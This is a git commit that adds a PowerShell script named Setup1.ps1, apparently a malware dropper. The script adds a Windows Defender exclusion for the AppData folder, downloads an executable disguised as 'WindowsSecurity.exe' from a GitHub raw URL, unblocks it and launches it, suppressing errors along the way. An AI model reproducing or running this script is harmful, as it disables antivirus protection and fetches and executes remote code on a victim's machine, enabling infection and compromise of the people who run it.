785e56f1220c97b1661fe454a1989d20410b83e2
zrxqzrxq123 <144971724+zrxqzrxq123@users.noreply.github.com>
2026-02-28 11:03:01 -0600

    Add files via upload

---
+++ Setup1.ps1
@@ -0,0 +1,12 @@
+$exePath = "$env:AppData\WindowsSecurity.exe"
+$exeUrl = "https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/WindowsSecurity.exe"
+
+# 1. Add Exclusion for AppData
+Add-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue
+
+# 2. Download the EXE
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0" -ErrorAction SilentlyContinue
+
+# 3. Unblock and Run
+Unblock-File $exePath
+Start-Process $exePath
